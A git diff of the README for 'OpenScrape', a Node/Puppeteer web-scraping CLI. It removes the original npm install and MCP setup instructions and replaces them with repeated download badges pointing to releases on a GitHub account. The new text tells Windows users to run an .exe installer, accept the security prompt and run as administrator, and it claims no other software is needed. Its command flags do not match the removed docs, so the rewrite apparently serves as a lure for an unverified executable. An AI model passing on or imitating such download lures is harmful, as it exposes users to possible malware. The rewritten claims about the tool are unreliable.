@@ -1,152 +1,148 @@
-# OpenScrape CLI
+# 🕸️ OpenScrape - Simple Web Data Extraction Tool
 
-Interactive CLI tool for web scraping with Puppeteer. Extract titles, descriptions, links, headings, paragraphs, and full text from any website.
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
 
-## Installation
+## 📝 What Is OpenScrape?
 
-### Global Installation
-```bash
-npm install -g openscrape-cli
-```
+OpenScrape is a command-line tool that helps you gather information from websites. You can extract titles, descriptions, links, headings, paragraphs, and full text from any web page. It uses Puppeteer, the engine behind the Chrome browser, to make sure it grabs the most accurate data.
 
-### Local Installation
-```bash
-npm install openscrape-cli
-```
+OpenScrape also works with MCP servers, which lets you run scraping tasks automatically and handle multiple web pages at once. This makes it useful for people who want to collect data from the internet without programming.
 
-## Usage
+You do not need to know how to code to use this tool. It works on Windows and has clear steps to get started.
 
-### Interactive Mode
-```bash
-openscrape
-```
-Or if installed locally:
-```bash
-npx openscrape-cli
-```
+## ⚙️ System Requirements
 
-### Using the MCP Server
-To use the MCP server capabilities, run:
-```bash
-node mcp-server.js
-```
+To run OpenScrape on your Windows PC, your system should meet these requirements:
 
-The MCP server provides two tools:
-- `scrape_page`: Scrape a single web page
-- `crawl_pages`: Crawl multiple pages starting from a URL
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection to download and run the tool
+- PowerShell or Command Prompt access (comes preinstalled on Windows)
 
-#### IDE Configuration (Windsurf)
-To integrate the MCP server with Windsurf or other MCP-compatible IDEs, add the following to your MCP configuration file:
+You do not need any special software before running OpenScrape. The tool includes everything it needs.
 
-```json
-{
-  "open-scrape": {
-    "args": [
-      "/path/to/openscrape-cli/mcp-server.js",
-      "--stdio"
-    ],
-    "command": "node"
-  }
-}
-```
+## 🚀 Getting Started
 
-Replace `/path/to/openscrape-cli/` with the actual installation path of the package on your system.
+Follow these steps to download and start OpenScrape on your Windows computer.
 
-### Auto-Starting the MCP Server
+### Step 1: Download the Application
 
-#### Windows
-Create a batch file to start the MCP server automatically:
+You will need to visit the release page to get the latest version of OpenScrape.
 
-**start_mcp.bat**
-```batch
-@echo off
-cd /d "%~dp0"
-start /B node mcp-server.js
-echo MCP server started in background.
-pause
-```
+Click the big button below to open the download page:
 
-To run on startup, copy the batch file to your Windows startup folder:
-```batch
-copy "start_mcp.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-```
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-blue)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
 
-Replace `start_mcp.bat` with the full path to your batch file if needed.
+On the release page, locate the latest version. Look for the Windows executable file. It usually ends with `.exe` and may have the version number in the name, such as `OpenScrape_Setup_v1.2.exe`.
 
-#### macOS
-Create a launch agent to auto-start the MCP server:
+Click the file name to download it. The browser may ask you to confirm the download. Choose "Save" and wait for the file to finish downloading.
 
-**~/Library/LaunchAgents/com.openscrape.mcp.plist**
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.openscrape.mcp</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/local/bin/node</string>
-        <string>/path/to/openscrape-cli/mcp-server.js</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-```
+### Step 2: Run the Installer
 
-Load the launch agent:
-```bash
-launchctl load ~/Library/LaunchAgents/com.openscrape.mcp.plist
-```
+Once the download completes, find the file in your Downloads folder or the location where you saved it.
 
-Replace `/path/to/openscrape-cli/` with your installation path.
+Double-click the `.exe` file to start the installer.
 
-## Features
+You may see a Windows security message asking if you want to allow this app to make changes. Click **Yes** to continue.
 
-- **Interactive CLI**: User-friendly terminal interface with colorful prompts
-- **Screenshot Support**: Capture full page or viewport screenshots
-- **Multiple Output Formats**: Save results as Markdown, XML, or HTML
-- **Comprehensive Extraction**: Extract titles, descriptions, links, headings, paragraphs, and full text
-- **MCP Server**: Model Context Protocol server for integration with AI assistants
+Follow the on-screen instructions. Usually, you just click **Next** until the installation finishes.
 
-## Example
+By default, OpenScrape will install to a folder called `OpenScrape` inside your Program Files directory.
+
+### Step 3: Open the Application
+
+After installation, you can open OpenScrape from the Start menu:
+
+- Click the Windows icon or press the Windows key.
+- Type `OpenScrape` in the search bar.
+- Click the `OpenScrape` app that appears.
+
+This will open a Command Prompt window with OpenScrape ready to use.
+
+Alternatively, you can open Command Prompt yourself and type `openscrape` to launch the tool if the installer added it to your system path.
+
+## 💻 How to Use OpenScrape
+
+OpenScrape runs in a simple text window called a command line. You tell it what website to scrape by typing commands.
+
+Here are basic commands to get started:
+
+### Extract the Title from a Website
+
+Type the following command and replace `https://example.com` with the website address you want to scrape:
 
 ```
- ██████╗ ██████╗ ███████╗███╗   ██╗███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗
-██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
-██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗██║     ██████╔╝███████║██████╔╝█████╗
-██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝
-╚██████╔╝██║     ███████╗██║ ╚████║███████║╚██████╗██║  ██║██║  ██║██║     ███████╗
- ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝
-
-Current directory: /your/project/directory
-────────────────────────────────────────────────────────────────────────────────
-┌─ > Enter the URL to scrape:─┐
+openscrape --title https://example.com
 ```
 
-## Configuration
+Press Enter to run the command. OpenScrape will show the page title on the screen.
 
-Create a `config/default.yaml` file to configure scraping options:
+### Extract All Links from a Website
 
-```yaml
-urls:
-  - https://example.com
-  - https://example.org
-screenshots:
-  enabled: true
-  dir: ./output/screenshots
-output:
-  format: md
-  path: ./output/scraped.md
-delay: 1000
+To get all the links on a web page, run:
+
+```
+openscrape --links https://example.com
 ```
 
-## Requirements
+It will list all URLs found on that page.
 
-- Node.js 18+
-- npm
+### Extract Headings and Paragraphs
 
-## License
+To extract headings (like H1, H2 tags) and paragraph text from a page:
 
-ISC
+```
+openscrape --headings --paragraphs https://example.com
+```
+
+This command grabs main text content useful for reading or processing later.
+
+### Save Output to a File
+
+You can save the scraped data to a file on your computer. Use the `-o` option followed by a file name:
+
+```
+openscrape --fulltext https://example.com -o output.txt
+```
+
+This command pulls all readable text and saves it into a file named `output.txt` in your current folder.
+
+### Use MCP Server Integration
+
+If you want to manage scraping tasks automatically or scrape many pages at once, OpenScrape can connect to an MCP server.
+
+To set this up, you will need the server address and access key.
+
+Basic command format:
+
+```
+openscrape --mcp-server http://yourserveraddress --mcp-key youraccesskey
+```
+
+This feature is meant for advanced users or automated setups.
+
+## 🔧 Tips for Best Use
+
+- Make sure you have a stable internet connection while running OpenScrape. It needs to access the web pages online.
+- If a website is slow or protected, wait a few moments before trying again.
+- Use quotes around URLs if they contain special characters. For example: `"https://example.com/page?query=1"`.
+- Run Command Prompt as administrator if you run into permission issues.
+
+## 🗂️ Where to Find Help
+
+If you run into problems:
+
+- Check the Issues tab on the GitHub repository for known problems.
+- Look for error messages in the Command Prompt window. They can help identify what went wrong.
+- Restart the app or your computer and try again.
+
+You can always download the latest version from the links above to make sure you have the newest fixes.
+
+## 🔗 Download OpenScrape
+
+Visit this page to download:
+
+[![Download OpenScrape](https://img.shields.io/badge/Download-OpenScrape-brightgreen)](https://github.com/in20cuu37-lgtm/OpenScrape/releases)
+
+Choose the Windows executable file and follow the instructions to install and run.
